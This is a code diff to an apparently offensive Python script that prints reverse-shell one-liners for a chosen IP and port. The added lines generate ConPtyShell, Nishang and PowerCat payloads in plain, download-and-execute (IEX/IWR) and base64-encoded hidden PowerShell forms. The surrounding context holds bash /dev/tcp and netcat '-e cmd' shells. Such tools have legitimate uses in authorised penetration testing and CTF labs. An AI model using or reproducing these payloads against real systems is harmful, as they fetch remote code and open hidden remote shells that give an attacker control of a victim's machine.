@@ -39,36 +39,94 @@ def main():
     print(f"stty raw -echo; fg")
     print(f"export TERM=xterm; reset xterm")
 
-    print("\n********** PowerShell payload **********\n")
+    print("\n********** PowerShell payload b64 encode **********\n")
     print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")
 
-    print("\n********** ConPtyShell **********\n")
+    print("\n\n\n********** ConPtyShell RevShell **********\n")
+    print(f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
+
+    print("\n********** ConPtyShell RevShell b64 **********\n")
+    payload = "Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
+    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** ConPtyShell Download & IEX **********\n")
+    print(f"IEX(IWR https://{ip}/Invoke-ConPtyShell.ps1 -UseBasicParsing)")
+
+    print("\n********** ConPtyShell Download & IEX b64 **********\n")
+    payload = "IEX(IWR https://{ip}/Invoke-ConPtyShell.ps1 -UseBasicParsing)"
+    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** ConPtyShell Download & Execution **********\n")
     print(f"IEX(IWR https://{ip}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
 
-    print("\n********** ConPtyShell base64 **********\n")
+    print("\n********** ConPtyShell Download & Execution b64 **********\n")
     payload = "IEX(IWR https://{ip}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}" 
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
-    print("\n********** Nishang **********\n")
+
+
+
+    print("\n\n\n********** Nishang payload **********\n")
     print(f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
 
-    print("\n********** Nishang base64 **********\n")
-    payload = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    print("\n********** Nishang payload b64**********\n")
+    payload = "Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
-    print("\n********** Powershell download & IEX**********\n")
-    payload, p64 = pwsh_down(ip, port)
-    print(payload)
-    print(f"\npowershell -nop -w hidden -enc {p64}")
+    print("\n********** Nishang Download & IEX **********\n")
+    print(f"IEX(IWR https://{ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing)")
+
+    print("\n********** Nishang Download & IEX b64 **********\n")
+    payload = "IEX(IWR https://{ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing)"
+    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** Nishang Download & Execution **********\n")
+    print(f"IEX(IWR https://{ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
+
+    print("\n********** Nishang Download & Execution b64 **********\n")
+    payload = f"IEX(IWR https://{ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+
+
+    print("\n\n\n********** PowerCat payload **********\n")
+    print(f"powercat -c {ip} -p {port} -e powershell")
+
+    print("\n********** PowerCat payload b64**********\n")
+    payload = "powercat -c {ip} -p {port} -e powershell"
+    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** PowerCat Download & IEX **********\n")
+    print(f"IEX(IWR https://{ip}/powercat.ps1 -UseBasicParsing)")
+
+    print("\n********** PowerCat Download & IEX b64 **********\n")
+    payload = "IEX(IWR https://{ip}/powercat.ps1 -UseBasicParsing)"
+    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    print(f"powershell -nop -w hidden -enc {p64}")
+
+    print("\n********** PowerCat Download & Execution **********\n")
+    print(f"IEX(IWR https://{ip}/powercat.ps1 -UseBasicParsing); powercat -c {ip} -p {port} -e powershell")
+
+    print("\n********** PowerCat Download & Execution b64 **********\n")
+    payload = f"IEX(IWR https://{ip}/powercat.ps1 -UseBasicParsing); powercat -c {ip} -p {port} -e powershell"
+    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    print(f"powershell -nop -w hidden -enc {p64}")
+
 
     text, encoded = pwsh_encode(ip, port)
-    print("\n********** Powershell reverse shell **********\n")
+    print("\n\n\n********** Powershell reverse shell oneliner **********\n")
     print(text)
     print(f"\npowershell -nop -w hidden -enc {encoded}")
 
-    print("\n********** Bash **********\n")
+
+    print("\n\n\n********** Bash **********\n")
     bash_payloads = [
         f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
         f"bash+-c+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'",
@@ -116,6 +174,8 @@ def main():
     print("Windows:\n")
     print(f"\tnc.exe -e cmd {ip} {port}")
     print(f"\t.\\nc64.exe -e powershell {ip} {port}\n")
+
+    print(f"More shells at: /usr/share/webshells\n")
 
 if __name__ == "__main__":
     main()
